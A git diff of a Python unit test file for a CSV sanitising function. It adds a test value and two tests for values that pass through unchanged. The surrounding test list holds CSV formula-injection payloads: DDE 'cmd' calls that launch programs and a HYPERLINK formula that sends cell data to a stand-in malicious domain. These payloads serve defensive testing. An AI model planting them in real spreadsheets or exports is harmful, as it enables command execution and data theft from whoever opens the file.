@@ -69,6 +69,7 @@ class TestUtilsMethods(unittest.TestCase):
                 "-1+1+cmd|' /C calc'!A0",
                 "@SUM(cmd|' /C calc'!A0)",
                 "=cmd|'/k ipconfig'!A0",
+                '=1+1',
 '=6-5 cmd|\' /C "C:\\Program Files\\InternetExplorer\\iexplore.exe" http://<attackers site>/asd.html\'!A0',
  '=HYPERLINK("https://maliciousDomain.com/evil.html?data="&A1,"Click to view additional information")'
         ]
@@ -97,6 +98,18 @@ class TestUtilsMethods(unittest.TestCase):
         for value in self.malicious_csv_values:
             with self.subTest(value=value):
                 self.assertRaises(ValueError, utils.sanitize_csv_value, value, errors='strict')
+
+    def test_sanitize_csv_not_str(self):
+        values = [1, 2.5, 1+2j, (1, 2), [1, 2]]
+        for value in values:
+            with self.subTest(value=value):
+                self.assertEqual(value, utils.sanitize_csv_value(value))
+
+    def test_sanitize_csv_digit_str(self):
+        values = ['1.1', '+1.1', '-1.1']
+        for value in values:
+            with self.subTest(value=value):
+                self.assertEqual(value, utils.sanitize_csv_value(value))
 
     @mock.patch("cmp_utils.common.get_dtype_by_data_type")
     def test_deserialize_dump_data_to_array(self, mock_common):
